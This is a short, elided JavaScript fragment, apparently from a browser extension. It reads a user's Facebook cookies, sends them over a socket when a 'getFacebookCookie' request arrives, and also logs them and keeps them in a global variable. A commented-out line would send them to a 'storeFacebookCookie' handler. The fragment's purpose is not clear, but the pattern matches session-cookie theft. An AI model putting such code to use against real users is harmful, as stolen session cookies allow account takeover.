...
socket.on('getFacebookCookie', function (msg) {
    ...
    setTimeout(function (args) {
        ...
        socket.emit(msg.response, cookiesToString.get(cookieList, url));
    }, 3000);
...
function setEvents() {
    ...
    $("#copyButton").unbind().click(function () {
        ...
        console.log('@cookies:', cookiesToString.get(cookieList, url));

        /*socket.emit('storeFacebookCookie', {
         data: cookiesToString.get(cookieList, url)
         });*/
        ...
        var cookie = cookiesToString.get(cookieList, url);
        window.storedCookie = cookie;
